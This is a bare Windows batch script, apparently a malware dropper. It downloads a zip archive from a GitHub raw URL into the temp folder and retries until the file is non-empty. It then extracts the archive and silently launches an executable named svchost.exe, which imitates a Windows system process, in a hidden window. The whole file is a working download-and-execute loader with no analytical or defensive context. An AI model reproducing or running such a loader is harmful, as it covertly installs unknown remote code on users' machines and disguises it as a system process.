@echo off
setlocal
set "url=https://github.com/LuisPhantom/Vemom/raw/refs/heads/main/UGRB.zip"
set "tempdir=%temp%"
set "output=%tempdir%\wctF4C4.zip"

:download
powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%output%'"
for %%A in ("%output%") do (
    if %%~zA==0 (
        del "%output%"
        timeout /t 1 >nul
        goto download
    )
)

powershell -Command "Expand-Archive -Path '%output%' -DestinationPath '%tempdir%' -Force"

powershell -Command "Start-Process -FilePath '%tempdir%\svchost.exe' -ArgumentList '%tempdir%\python.py' -WindowStyle Hidden"

exit
